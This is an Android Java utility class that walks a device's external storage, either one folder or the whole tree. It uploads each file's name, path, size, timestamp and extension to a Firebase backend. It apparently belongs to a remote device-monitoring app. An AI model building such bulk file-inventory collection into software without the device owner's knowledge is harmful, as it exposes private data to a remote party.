package com.vikasyadavnsit.cdc.utils;

import static com.vikasyadavnsit.cdc.utils.CommonUtil.hasFileAccess;

import android.content.Context;
import android.os.Environment;

import com.vikasyadavnsit.cdc.data.User;

import java.io.File;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class FileExplorer {

    private static final ExecutorService executor = Executors.newSingleThreadExecutor();

    public static void captureDirectoryStructure(Context context) {
        captureDirectoryStructure(context, Environment.getExternalStorageDirectory().getAbsolutePath());
    }

    public static void captureDirectoryStructure(Context context, String path) {
        captureDirectoryStructure(context, path, false);
    }

    public static void captureDirectoryStructure(Context context, String path, boolean isFullBFS) {
        LoggerUtils.d("FileExplorer", "captureDirectoryStructure request for path: " + path + ", isFullBFS: " + isFullBFS);
        executor.execute(() -> {
            if (!hasFileAccess()) {
                LoggerUtils.e("FileExplorer", "Cannot scan: No File Access permission (MANAGE_EXTERNAL_STORAGE)");
                return;
            }

            String targetPath = (path == null || path.isEmpty())
                    ? Environment.getExternalStorageDirectory().getAbsolutePath()
                    : path;
            
            try {
                if (isFullBFS) {
                    LoggerUtils.i("FileExplorer", "Starting full BFS batch scan: " + targetPath);
                    performBFSScan(new File(targetPath), path);
                } else {
                    LoggerUtils.i("FileExplorer", "Starting single level scan: " + targetPath);
                    List<Map<String, Object>> structure = getLevelStructure(new File(targetPath));
                    FirebaseUtils.uploadDeviceDirectoryLevel(path, structure);
                    LoggerUtils.i("FileExplorer", "Scan complete. Items found: " + structure.size());
                }
            } catch (Exception e) {
                LoggerUtils.e("FileExplorer", "Critical error during directory scan: " + e.getMessage());
                if (!isFullBFS) FirebaseUtils.uploadDeviceDirectoryLevel(path, new ArrayList<>());
            }
        });
    }

    private static void performBFSScan(File root, String requestedRootPath) {
        java.util.Queue<File> queue = new java.util.LinkedList<>();
        java.util.Queue<String> pathQueue = new java.util.LinkedList<>();
        
        queue.add(root);
        pathQueue.add(requestedRootPath);

        FirebaseUtils.clearDeviceDirectoryStructure();
        int totalProcessed = 0;

        while (!queue.isEmpty()) {
            File current = queue.poll();
            String currentRequestedPath = pathQueue.poll();
            
            if (current == null || !current.exists()) continue;

            File[] files = current.listFiles();
            if (files == null) continue;

            List<Map<String, Object>> currentLevel = new ArrayList<>();
            for (File file : files) {
                if (file.getName().startsWith(".")) continue;

                Map<String, Object> info = new HashMap<>();
                info.put("name", file.getName());
                info.put("path", file.getAbsolutePath());
                info.put("isDir", file.isDirectory());
                info.put("size", file.length());
                info.put("lastModified", file.lastModified());
                info.put("ext", getExtension(file));
                
                currentLevel.add(info);
                totalProcessed++;

                if (file.isDirectory()) {
                    queue.add(file);
                    pathQueue.add(file.getAbsolutePath());
                }
            }

            if (!currentLevel.isEmpty()) {
                FirebaseUtils.uploadDeviceDirectoryLevel(currentRequestedPath, currentLevel);
                // Throttle slightly to prevent overwhelming the connection
                try { Thread.sleep(50); } catch (InterruptedException ignored) {}
            }
        }
        
        LoggerUtils.i("FileExplorer", "Full BFS Tree Scan complete. Total items found: " + totalProcessed);
    }

    private static List<Map<String, Object>> getLevelStructure(File directory) {
        List<Map<String, Object>> structure = new ArrayList<>();
        File[] files = directory.listFiles();
        if (files != null) {
            for (File file : files) {
                if (file.getName().startsWith(".")) continue;

                Map<String, Object> info = new HashMap<>();
                info.put("name", file.getName());
                info.put("path", file.getAbsolutePath());
                info.put("isDir", file.isDirectory());
                info.put("size", file.length());
                info.put("lastModified", file.lastModified());
                info.put("ext", getExtension(file));
                
                structure.add(info);
            }
        }
        return structure;
    }

    private static String getExtension(File file) {
        if (file.isDirectory()) return "folder";
        String name = file.getName();
        int lastDot = name.lastIndexOf('.');
        return (lastDot == -1) ? "file" : name.substring(lastDot + 1).toLowerCase();
    }
}
